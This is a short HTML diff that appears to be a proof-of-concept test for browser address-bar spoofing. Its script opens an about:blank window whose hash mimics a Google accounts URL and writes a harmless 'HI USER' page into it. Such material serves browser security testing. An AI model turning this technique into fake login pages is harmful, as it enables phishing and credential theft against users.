@@ -1,0 +1,28 @@
+<body>
+  <script>
+    function go() {
+      // Open a new about:blank window with a spoofed-looking hash in the URL
+      var x = window.open('about:blank#verylongurl.googlecloudplatform.accounts.google.com');
+
+      // Inject content into the new window
+      setTimeout(() => {
+        try {
+          x.document.open();
+          x.document.write(`
+            <html>
+              <head><title>Welcome</title></head>
+              <body>
+                <h1>HI USER</h1>
+              </body>
+            </html>
+          `);
+          x.document.close();
+        } catch (e) {
+          console.warn("Blocked by browser protections:", e);
+        }
+      }, 50);
+    }
+  </script>
+
+  <input onclick="go()" value="Click here" type="button" />
+</body>
